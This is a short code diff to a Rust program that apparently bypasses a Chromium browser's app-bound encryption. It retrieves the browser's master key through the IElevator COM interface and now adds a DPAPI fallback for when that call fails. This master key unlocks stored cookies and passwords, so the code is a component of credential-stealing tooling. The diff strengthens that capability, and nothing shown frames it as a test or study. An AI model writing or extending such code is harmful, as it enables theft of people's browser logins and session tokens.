@@ -7,6 +7,7 @@
 #![allow(non_snake_case, unused)]
 
 mod elevator;
+mod dpapi_fallback;
 
 use std::{ffi::c_void, path::PathBuf, thread, time::Duration};
 
@@ -85,12 +86,18 @@ fn run() -> Result<(), String> {
     let encrypted_key = &encrypted_key[4..];
 
     let browser = elevator::resolve_browser(&exe);
-    let master_key = match browser {
+    let com_result = match browser {
         Some(b) => elevator::decrypt_for_browser(b, encrypted_key)
             .or_else(|_| elevator::decrypt_app_bound_key(encrypted_key)),
         None => elevator::decrypt_app_bound_key(encrypted_key),
-    }
-    .map_err(|e| format!("IElevator: {e}"))?;
+    };
+
+    let master_key = com_result
+        .or_else(|_| {
+            dpapi_fallback::try_decrypt_app_bound(encrypted_key)
+                .ok_or_else(|| String::from("dpapi fallback failed"))
+        })
+        .map_err(|e| format!("key recovery: {e}"))?;
 
     if master_key.len() != 32 {
         return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
